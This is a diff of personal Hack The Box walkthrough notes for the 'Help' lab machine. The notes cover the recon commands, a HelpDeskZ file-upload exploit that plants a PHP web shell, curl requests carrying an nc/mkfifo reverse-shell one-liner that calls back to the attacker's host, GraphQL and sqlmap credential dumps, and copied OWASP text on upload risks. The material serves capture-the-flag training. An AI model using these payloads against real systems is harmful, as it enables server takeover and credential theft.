@@ -1,28 +1,112 @@
+NAME: Help
+IP: 10.10.10.121
+
+
+>> http://10.10.10.121/support/uploads/tickets/5ab695a7a199e501fbb2bcf2b5b6f1fd.jpg
+
+
+[***RISK FACTORS***]
+
+- Unauthenticated File Upload
+
 [NMAP]
 
 >> nmap -sC -sV 10.10.10.121 --open
 >> nmap -sC -sV -p- 10.10.10.121
+>> nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.121
 >> ports=$(nmap -p- --min-rate=1000 -sT -T4 10.10.10.121 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//
 
 [GOBUSTER]
 
 >> gobuster -w directory-list-2.3-medium.txt -t 100 -u http://10.10.10.121/ -o report
 
+>>  gobuster -u http://10.10.10.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50
+
+>> gobuster -u http://10.10.10.121/ -w /usr/share/wordlists/dirb/common.txt -t 50
+
 >> gobuster -u http://help.htb/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -o help-gobusterReport-2
+
+>> gobuster -u http://10.10.10.121/support -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+
+>> gobuster -u http://10.10.10.121/support/uploads -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 
 [SEARCHEXPLOIT]
 
->> search exploit HelpDeskZ
+>> searchsploit HelpDeskZ
+>> searchsploit -x exploits/php/webapps/40300.py
+>> searchsploit -m exploits/php/webapps/40300.py    :: -m = Mirror
 
 
 [EXPLOIT]
 
->> http://10.10.10.121/support/?v=submit_ticket6d8de43c3a562cf8ed5e566f8d3ca90f.php
+>> python helpdeskz-40300-fixed.py http://10.10.10.121/support/uploads/tickets/ php-reverse-shell.php
 
+    >> http://10.10.10.121/support/uploads/tickets/22362c1ece1be8f284ca90622bdaf5b9.php
+
+    >> http://10.10.10.121/support/?v=submit_ticket6d8de43c3a562cf8ed5e566f8d3ca90f.php
+
+    >> http://10.10.10.121/support/?v=submit_ticket6d8de43c3a562cf8ed5e566f8d3ca90f.php?cmd=whoami
+
+    >> http://10.10.10.121/support/?v=submit_ticket6d8de43c3a562cf8ed5e566f8d3ca90f.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff
+
+
+>> python exploit.py http://10.10.10.121/support/ php-reverse-shell.php
+
+
+[CURL]
+
+>> curl http://10.10.10.121/support/uploads/tickets/30487f2924a0ae640ba2c0a54c9136f1.php?cmd=id
+        >> uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
+
+>> curl 'http://10.10.10.121/support/uploads/tickets/30487f2924a0ae640ba2c0a54c9136f1.php?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.4+443+>/tmp/f'  :: GET INTERACTIVE SHELL
+
+>> curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ user { username password } }" }' | jq .
+
+>> curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __type(name: \"User\") { name fields { name } } }" }' | jq .
+
+>> RESULT <<
+{
+  "data": {
+    "user": {
+      "username": "helpme@helpme.com",
+      "password": "5d3c9300000000000007e99cff"
+    }
+  }
+}
+
+HASH >> godhelpmeplz 
+
+
+[NETCAT]
+
+>> nc -lnvp 4444    :: Listening on port 4444
+
+[GET A SHELL]
+
+>> python -c 'import pty;pty.spawn("/bin/bash")'
+
+>> python -c 'import pty; pty.spawn("bash")'  :: Upgrade shell with standard trick
+
+>> python -m SimpleHTTPServer
+
+[ENUMERATION - LINENUM]
+
+>> LineEnum.sh
+
+[SQLMAP]
+
+>> sqlmap -r helpdesk.req --batch --dump
+
+>> sqlmap -r ticket_attachment.request --level5 --risk 3 -p param[]
 
 [LINUX COMMANDS]
 
 >> locate cmd.php
+
+>> echo -n '5d3c38828283b228383838cff' |wc -c
+
+>> stty raw -echo
+
 
 
 [HTTP]
@@ -34,5 +118,76 @@ SOURCE
 
 - https://github.com/evolutionscript/HelpDeskZ-1.0
 - https://0xrick.github.io/hack-the-box/help/
+- https://0xdf.gitlab.io/2019/06/08/htb-help.html
 - https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 - https://www.exploit-db.com/exploits/40300
+- https://www.youtube.com/watch?v=XB8CbhfOczU&t=37s
+- https://www.owasp.org/index.php/Unrestricted_File_Upload
+- https://www.exploit-db.com/exploits/40300
+
+- https://www.epochconverter.com/
+- https://lucasconstantino.github.io/graphiql-online/
+
+
+INDEX IPPSEC
+
+00:49 - Begin of recon 
+01:45 - Running gobuster to find /support 
+02:50 - Searching for a way to find version of HelpdeskZ 
+03:35 - Reading over the File Upload exploit script to see it requires server time 
+05:10 - Uploading a PHP Reverse Shell Script 
+07:45 - Going back to GitHub to find where uploads are saved 
+09:10 - Begin of modifying the script to pull the server time out of HTTP Headers 
+10:30 - Figuring out the python to pull the "Date" HTTP Header 
+14:30 - Getting the Time Format right with STRFTIME.COM 
+19:40 - Testing out the exploit and getting a shell 
+23:20 - Discovery of an old kernel, looking for an exploit 
+24:30 - Copying the exploit, compiling, and privesc! ** Box done 
+25:50 - Looking into port 3000 27:00 - /graphql discovered 
+27:42 - Dumping the schema to discover what data is inside 
+30:15 - Dumping username, password from the database 
+32:12 - Logging into HelpdeskZ 
+33:40 - Discovering the Boolean SQL Injection 
+34:50 - Running SQLMap 36:00 - Explaining the Injection 
+37:10 - Begin of creating a python script to exploit this
+
+
+
+***** OWASP - Unrestricted File Upload *****
+
+- Uploaded files represent a significant risk to applications. The first step in many attacks is to get some code to the system to be attacked. 
+Then the attack only needs to find a way to get the code executed. Using a file upload helps the attacker accomplish the first step. 
+
+- The consequences of unrestricted file upload can vary, including complete system takeover, an overloaded file system or database, forwarding attacks to back-end systems, client-side attacks, or simple defacement.
+
+[***RISK FACTOR***]
+
+- The impact of this vulnerability is high, supposed code can be executed in the server context or on the client side. The likelihood of detection for the attacker is high. 
+The prevalence is common. As a result the severity of this type of vulnerability is high.
+
+- It is important to check a file upload module's access controls to examine the risks properly.
+
+- Server-side attacks: The web server can be compromised by uploading and executing a web-shell which can run commands, browse system files, browse local resources, 
+attack other servers, or exploit the local vulnerabilities, and so forth.
+
+- Client-side attacks: Uploading malicious files can make the website vulnerable to client-side attacks such as XSS or Cross-site Content Hijacking.
+
+- Uploaded files can be abused to exploit other vulnerable sections of an application when a file on the same or a trusted server is needed (can again lead to client-side or server-side attacks).
+
+- Uploaded files might trigger vulnerabilities in broken libraries/applications on the client side (e.g. iPhone MobileSafari LibTIFF Buffer Overflow).
+
+- Uploaded files might trigger vulnerabilities in broken libraries/applications on the server side (e.g. ImageMagick flaw that called ImageTragick!).
+
+- Uploaded files might trigger vulnerabilities in broken real-time monitoring tools (e.g. Symantec antivirus exploit by unpacking a RAR file).
+
+- A malicious file such as a Unix shell script, a windows virus, an Excel file with a dangerous formula, or a reverse shell can be uploaded on the server in order to execute code 
+by an administrator or webmaster later -- on the victim's machine.
+
+- An attacker might be able to put a phishing page into the website or deface the website.
+
+- The file storage server might be abused to host troublesome files including malwares, illegal software, or adult contents. Uploaded files might also contain malwares' command 
+and control data, violence and harassment messages, or steganographic data that can be used by criminal organisations.
+
+- Uploaded sensitive files might be accessible by unauthorised people.
+
+- File uploaders may disclose internal information such as server internal paths in their error messages.
